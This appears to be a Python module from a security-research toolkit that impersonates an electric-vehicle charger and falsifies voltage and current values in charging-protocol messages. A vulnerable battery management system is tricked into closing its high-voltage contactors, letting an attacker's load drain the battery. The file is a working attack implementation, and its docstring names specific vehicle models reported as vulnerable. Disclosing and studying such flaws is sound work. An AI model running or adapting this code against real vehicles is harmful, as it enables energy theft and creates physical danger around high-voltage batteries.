"""
Attack A2 — Unauthorized Energy Extraction via BMS state confusion.

Paper reference: `paper/4、Methodology.tex` §Attack 2.

What it does
------------
Runs HotWire as an EVSE and overrides the outbound ``PreChargeRes``'s
``EVSEPresentVoltage`` field to match the EV's requested ``EVTargetVoltage``.
On a vulnerable BMS (one that trusts the protocol assertion instead of
measuring actual DC voltage), the vehicle believes precharge completed
successfully and closes its high-voltage contactors — exposing the battery
to whatever load the attacker has wired to the DC pins.

In a real attack, the attacker's resistive load bank draws current from
the battery through the closed contactors. HotWire's software-only role is
to lie convincingly at the protocol level; the hardware side (load bank,
current sensing, safety interlocks) is out of scope — see
``paper/5、Experimental Setup.tex`` and :file:`../../SAFETY.md`.

Tesla Model Y (tested in the paper) is NOT vulnerable because its BMS
independently measures DC voltage before closing contactors. Luxgen n7,
CMC (unpublished), and Hyundai IONIQ 6 were all vulnerable in testing.
"""
from __future__ import annotations

from dataclasses import dataclass

from ..core.modes import C_EVSE_MODE
from .base import Attack


@dataclass
class ForcedDischarge(Attack):
    """Sustained-discharge override — lies about EVSEPresentVoltage AND
    EVSEPresentCurrent across PreCharge *and* the CurrentDemand loop.

    Fields
    ------
    voltage
        The fake ``EVSEPresentVoltage`` we announce in every PreChargeRes
        and CurrentDemandRes (V). Pick close to the target EV's battery
        voltage so the BMS exits precharge.
    current
        The fake ``EVSEPresentCurrent`` we announce during the
        CurrentDemand loop (A). This number doesn't need to be accurate —
        the real current is dictated by the attacker's load bank, not the
        protocol claim. But it should be nonzero so the EV doesn't decide
        charging isn't happening and abort. Default 1 A.
    """

    voltage: int = 380
    current: int = 1

    def __post_init__(self) -> None:
        if not 1 <= self.voltage <= 1000:
            raise ValueError(
                f"voltage must be 1..1000 V; got {self.voltage}"
            )
        if not 0 <= self.current <= 500:
            raise ValueError(
                f"current must be 0..500 A; got {self.current}"
            )
        self.name = "A2 — Unauthorized Energy Extraction"
        self.mode = C_EVSE_MODE
        self.description = (
            f"Announce EVSEPresentVoltage={self.voltage} V in every "
            f"PreChargeRes AND in every CurrentDemandRes throughout the "
            f"charging loop (along with EVSEPresentCurrent={self.current} A). "
            f"A vulnerable BMS that trusts protocol state over physical "
            f"sensors will close its contactors and keep them closed, "
            f"exposing the battery to the attacker's load for as long as "
            f"the EV maintains the session."
        )
        self.overrides = {
            "PreChargeRes": {"EVSEPresentVoltage": self.voltage},
            "CurrentDemandRes": {
                "EVSEPresentVoltage": self.voltage,
                "EVSEPresentCurrent": self.current,
            },
        }
